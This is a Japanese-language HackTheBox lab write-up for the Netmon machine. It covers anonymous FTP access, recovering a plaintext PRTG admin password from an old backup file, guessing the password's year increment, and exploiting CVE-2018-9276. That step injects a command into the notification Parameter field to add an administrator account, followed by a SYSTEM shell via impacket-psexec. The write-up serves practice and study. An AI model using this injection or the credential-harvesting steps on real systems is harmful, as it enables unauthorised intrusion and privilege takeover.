+++
title = "HackTheBox - Netmon Writeup"
date = "2026-04-08"
description = "FTP匿名アクセスでPRTG設定ファイルを取得し、CVE-2018-9276でSYSTEM奪取"
tags = ["HackTheBox", "CTF", "Windows", "CVE-2018-9276", "PRTG", "impacket", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field      | Details            |
|------------|--------------------|
| Machine    | Netmon             |
| OS         | Windows            |
| Difficulty | Easy               |
| IP         | 10.129.230.176     |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 10.129.230.176
```

```text
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd
80/tcp   open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

FTPが匿名アクセス可能、ポート80でPRTG Network Monitor 18.1.37が稼働していることを確認。

---

## FTP Anonymous Access

匿名でFTPにログインし、Cドライブ全体を閲覧できることを確認。

```bash
ftp 10.129.230.176
# Name: anonymous
# Password: (空Enter)
```

### User Flag取得

```bash
ftp> cd Users/Public
ftp> get user.txt
```

### PRTG設定ファイルの取得

PRTGはデフォルトで `C:\ProgramData\Paessler\PRTG Network Monitor\` に設定ファイルを保存する。FTP経由でバックアップファイルを発見・取得する。

```bash
ftp> cd /
ftp> cd ProgramData
ftp> cd Paessler
ftp> cd "PRTG Network Monitor"
ftp> ls
```

```text
PRTG Configuration.dat
PRTG Configuration.old
PRTG Configuration.old.bak   ← 通常存在しないバックアップファイル
```

```bash
ftp> get "PRTG Configuration.old.bak"
ftp> exit
```

### 認証情報の抽出

```bash
grep -i "password" "PRTG Configuration.old.bak"
```

```text
<!-- User: prtgadmin -->
PrTg@dmin2018
```

バックアップファイルには古いパスワードが記載されている。年号のパターンから `PrTg@dmin2019` を推測してログイン試行。

---

## PRTG Network Monitor Login

```
URL      : http://10.129.230.176
Username : prtgadmin
Password : PrTg@dmin2019
```

ログイン成功。バージョンは **18.1.37**（CVE-2018-9276の対象：18.1.39未満）。

---

## Foothold — CVE-2018-9276 (RCE)

PRTGの通知機能「Execute Program」にコマンドインジェクションが可能な脆弱性が存在する。PRTGはデフォルトでSYSTEM権限で動作するため、直接SYSTEM権限でのコマンド実行が可能。

### 手順

1. `Setup` → `Account Settings` → `Notifications` → `Add new notification`
2. `Execute Program` を有効化
3. Program File: `Demo exe notification - outfile.ps1`
4. Parameter欄に以下を入力：

```
abc.txt | net user htb abc123! /add ; net localgroup administrators htb /add
```

5. `OK` で保存後、通知一覧からベルアイコン🔔をクリックしてトリガー

---

## SYSTEM Shell

作成したユーザーでimpacket-psexecを使用してログイン。

```bash
impacket-psexec htb:'abc123!'@10.129.230.176
```

```text
Microsoft Windows [Version 10.0.14393]
C:\Windows\system32>
```

SYSTEM権限のシェル取得に成功。

---

## Flags

### User

```bash
ftp> get user.txt
```

### Root

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Summary

FTP匿名アクセス → PRTG設定バックアップから認証情報取得 → パスワードパターン推測でログイン → CVE-2018-9276でSYSTEM取得
